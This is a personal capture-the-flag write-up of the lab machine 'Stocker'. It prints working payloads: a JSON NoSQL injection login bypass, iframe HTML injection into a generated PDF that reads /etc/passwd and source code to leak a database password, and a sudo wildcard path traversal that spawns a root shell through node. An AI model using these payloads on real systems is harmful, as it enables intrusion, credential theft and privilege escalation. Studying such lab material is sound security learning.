# Stocker Helped-Through

Name: Stocker
Date:  25/06/2023
Difficulty: Easy  
Goals:  
- Learn some JS iframe coding
- Request smuggling broader than just json, I know of but have not done a HTTP request smuggle 
- Revise nosql injections
Learnt:
Beyond Root:
- Write a malicious iframe for a project

Both.. 
- [[Stocker-Notes.md]]
- [[Stocker-CMD-by-CMDs.md]]
..Will  be empty as this is a quick a Helped-Through as it needs to be to get the box done as a gateway to learning and writing Javascript especially Iframes. I do not have a web background, but I do enjoy web exploitation as part of a mix diet of exploits. I will be following along with [Ippsec](https://www.youtube.com/watch?v=fWMHh8GYqJE) as I saw during my lunch break today and thought how I have never manipulated iframes or made web application code; and I have no done a nosql injection in a while. Or done request smuggling through json.

<iframe width="560" height="315" src="https://www.youtube.com/embed/fWMHh8GYqJE" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

## Recon

Nothing from ping.
![ping](Screenshots/ping.png)
I rreran a nmap scan for [ubuntu bionic](https://launchpad.net/ubuntu/+source/openssh/1:7.6p1-4ubuntu0.5) from dorking `lauchpad 4ubuntu0.5`

`nikto` output a redirect to stocker.htb and nuclei found [[nginx-version-http___stocker.htb_]] running. `ffuf` for vhosts with 

```bash
ffuf -u http://stocker.htb -H "Host: FUZZ.stocker.htb" -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ --mc all -fw 6
```

As shown:
![](ffuffindsdev.png)

Adding dev.stocker.htb to hosts file 
![](signinatdev.png)

## Exploit

![](demoingnosqlifail.png)

Because this Node.js (as it has libraries and frameworks for handling JSON ) *and web applications commonly use json to handle requests* convert  `Content-Type: application/x-www-form-urlencoded` to `Content-Type: application/json` . 

```json
username[$ne]=ippsec&password[$ne]=password
// Convert to
{
"username":"ippsec", 
"password":"password" 
}
```

With all attacks that involve JSON or backend that can handle JSON you should always send broken JSON for the error message.

![](nodeerrorfromjson.png)

And the full error message:
```js
SyntaxError: Unexpected end of JSON input<br> &nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)<br> &nbsp; &nbsp;at parse (/var/www/dev/node_modules/body-parser/lib/types/json.js:89:19)<br> &nbsp; &nbsp;at /var/www/dev/node_modules/body-parser/lib/read.js:128:18<br> &nbsp; &nbsp;at AsyncResource.runInAsyncScope (node:async_hooks:203:9)<br> &nbsp; &nbsp;at invokeCallback (/var/www/dev/node_modules/raw-body/index.js:231:16)<br> &nbsp; &nbsp;at done (/var/www/dev/node_modules/raw-body/index.js:220:7)<br> &nbsp; &nbsp;at IncomingMessage.onEnd (/var/www/dev/node_modules/raw-body/index.js:280:7)<br> &nbsp; &nbsp;at IncomingMessage.emit (node:events:513:28)<br> &nbsp; &nbsp;at endReadableNT (node:internal/streams/readable:1359:12)<br> &nbsp; &nbsp;at process.processTicksAndRejections (node:internal/process/task_queues:82:21)</pre>
```

This confirms it is accepting JSON object
- Leaks /var/www/dev

Given that this is more just structured data conversion I think the best thing to do is just to call this Content-type-conversion until I have found a similar techniques as all that will be returned when searching for this would be HTTP request smuggling. [Burpplugin](https://portswigger.net/bappstore/db57ecbe2cb7446292a94aa6181c9278)
```json
{
"username":{
"$ne":"user"}, 
"password":{
"$ne":"passwd"}
}
```

We can then change the request to:
![](nestedjson.png)

A very expensive bin.
![](buythestock.png)

## Foothold

Lets buy a bin.
![](addabin.png)

Review our purchase 
![](presscart.png)

Purchase ID
![](purchaseid.png)

```
64988ad6f286ddc6c0375d05
```

Click on here
![](pdfdemo.png)

Add an axe and purchase another bin to make wheelie-bin-chariot of violence. 
![](addanaxe.png)

![](binandaxeid.png)

Comparing the ids they are really similar, this is not md5 or a hash
```
64988ba3f286ddc6c0375d0a
64988ad6f286ddc6c0375d05
same - changed - same - changed
64988 ba3f286 ddc6c0375d 0a
64988 ad6f286 ddc6c0375d 05
```

PDF?
- `exiftool`
- vulnerable, exploits? - check it manual as below or dork
- html injectable? 

Check for exploit with `Skia/PDF m108 exploit` and the part of this box that got excited to try this was, because it is chromium put an iframe in it. 
![](skia.png)

Firstly the intial request:
![](initialreqforhtlminject.png)

```json
{
// Pick a field that will be displayed in the html
"title":"Bin<iframe src='file:///etc/passwd'></iframe>",
},
```

And proof:
![](passwdpoc.png)

We can add stuff to this to improve this skip to the beyond root section where I add some features  
```js
<iframe src='file:///etc/passwd' height='1000' width='1000'></iframe>

<iframe src='file:///var/www/dev/index.js' height='1000' width='1000'></iframe>
```

![](passwdindev.png)

```js
// TODO: Configure loading from dotenv for production
const db = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";
```

angoose user has reused the `IHeardPassphrasesArePrettySecure` password so ssh in!
![](wearetheangoose.png)

## PrivEsc

The scripts that can run as sudo: 
![](scripts.png)

Because of the wild card we can directory traversal as \* being anything can be: 
```bash
sudo /usr/bin/node /usr/local/scripts/../../../dev/shm/ippsec.js
```

[node shell gtfobins](https://gtfobins.github.io/gtfobins/node/#shell)
```js
require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})
```

And root
![](root.png)

## Beyond Root

Iframe research

https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/iframes-in-xss-and-csp
https://www.invicti.com/blog/web-security/frame-injection-attacks/
https://owasp.org/www-community/attacks/Clickjacking
https://portswigger.net/web-security/clickjacking
https://blog.logrocket.com/the-ultimate-guide-to-iframes/

html injection
https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection
https://www.invicti.com/learn/html-injection/
https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection

- Make a malicious PDF 
- Malicious Web pages 

[regex in sudoers file](https://www.youtube.com/watch?v=fWMHh8GYqJE)

[read 0xdf](https://0xdf.gitlab.io/2023/06/24/htb-stocker.html)